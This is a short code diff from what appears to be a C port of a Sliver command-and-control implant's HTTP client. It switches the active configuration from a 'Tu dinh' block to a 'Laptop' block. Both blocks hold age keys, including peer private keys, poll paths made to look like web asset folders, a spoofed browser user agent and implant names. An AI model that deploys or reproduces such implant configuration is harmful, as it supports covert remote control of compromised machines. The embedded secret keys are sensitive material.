@@ -953,7 +953,7 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit
 	PBYTE pTemp = NULL;
 
 	// Tu dinh config --------------------------------------------------------------------
-	CHAR szRecipientPubKey[] = "age1r572ves6lze95fmtfah5lxrxmmt43y6pn6yj3hqzpjrugugnff0s3jfjul";
+	/*CHAR szRecipientPubKey[] = "age1r572ves6lze95fmtfah5lxrxmmt43y6pn6yj3hqzpjrugugnff0s3jfjul";
 	CHAR szPeerPubKey[] = "age1gy3epqygrqfmfj860dxgpje4lrf6u784g0xggwkqtezvhf8cf55qeg0lxv";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1HUNWLD0YWPK98AA7S6FQDWKTVSX9HS6QDVQV9Q4G82EPWJ6K3ZPQDT6MHN";
 	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
@@ -965,10 +965,10 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";
 	UINT64 uEncoderNonce = 51666;
-	CHAR szSliverClientName[32] = "TALL_MEAT";
+	CHAR szSliverClientName[32] = "TALL_MEAT";*/
 
 	// Laptop config ---------------------------------------------------------------------
-	/*CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
+	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
 	CHAR szPeerPubKey[] = "age1xxvadfula0d3heqzya5r4tkqscwmglhmnuwca9g05dwupk9qt3fsm0d40v";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1G2J4HELJ5LWC5VNU3A94GGHZL7D2ADNQ4EZY9SHEH6ZMRHYY2D3QWJ8GAN";
 	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
@@ -980,7 +980,7 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	UINT64 uEncoderNonce = 6979;
-	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";*/
+	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
 	// END -------------------------------------------------------------------------------
 	DWORD i = 0;
 
